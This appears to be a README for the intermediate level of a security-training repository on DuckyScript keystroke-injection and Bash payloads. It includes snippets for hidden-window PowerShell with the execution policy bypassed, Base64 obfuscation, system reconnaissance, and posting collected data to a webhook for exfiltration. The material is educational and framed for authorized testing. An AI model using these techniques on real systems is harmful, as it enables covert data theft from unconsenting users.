# Intermediate Level - Security Training

## Overview

This section contains more complex payloads and exercises that build on basic skills, introducing reconnaissance, data collection, and basic exfiltration techniques.

---

## Contents

| Directory | Description |
|-----------|-------------|
| [Ducky](Ducky/) | Intermediate DuckyScript payloads |
| [Bash](Bash/) | Intermediate Bash scripts |
| [Challenges](Challenges/) | More challenging hands-on exercises |
| [Practice](Practice/) | Advanced lab setups |

---

## Learning Objectives

After completing the Intermediate level, you will be able to:

- Write multi-stage payloads with error handling
- Collect system information programmatically
- Implement basic data exfiltration
- Use conditional logic in payloads
- Understand Windows PowerShell for security testing
- Create stealthy payloads with hidden windows

---

## Prerequisites

- Completion of Basic level
- Familiarity with Windows Command Prompt and PowerShell
- Understanding of basic networking concepts
- Access to a test lab environment

---

## Key Concepts

### PowerShell Integration

```
STRING powershell -w hidden -ep bypass
REM Hidden window, execution policy bypassed

STRING powershell -enc BASE64STRING
REM Base64 encoded commands for obfuscation
```

### Error Handling

```
STRINGLN try { risky-command } catch { fallback }
REM Try-catch for graceful failure handling
```

### Data Collection

```powershell
# System information
$env:COMPUTERNAME
$env:USERNAME
Get-CimInstance Win32_OperatingSystem

# Network information
Get-NetIPAddress
Get-DnsClientServerAddress
```

### Basic Exfiltration

```powershell
# HTTP POST to webhook
Invoke-WebRequest -Uri $url -Method POST -Body $data

# Write to temp file
$data | Out-File "$env:TEMP\output.txt"
```

---

## Skill Progression

```
┌─────────────────────────────────────────────────────────────────────┐
│                    INTERMEDIATE SKILL PATH                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. PowerShell Basics                                               │
│     └── Learn Windows automation fundamentals                       │
│                                                                      │
│  2. System Reconnaissance                                           │
│     └── Gather information about target systems                     │
│                                                                      │
│  3. Network Discovery                                               │
│     └── Identify network configuration and neighbors                │
│                                                                      │
│  4. Credential Awareness                                            │
│     └── Understand where credentials are stored                     │
│                                                                      │
│  5. Data Staging                                                    │
│     └── Prepare data for exfiltration                               │
│                                                                      │
│  6. Basic Exfiltration                                              │
│     └── Transfer data to collection point                           │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Safety Reminder

All payloads in this section are for **authorized security testing and educational purposes only**. At this level, payloads can collect sensitive information - always ensure proper authorization.

---

[← Basic Level](../01_Basic/) | [Back to Skill Levels](../README.md) | [Next: Advanced →](../03_Advanced/)
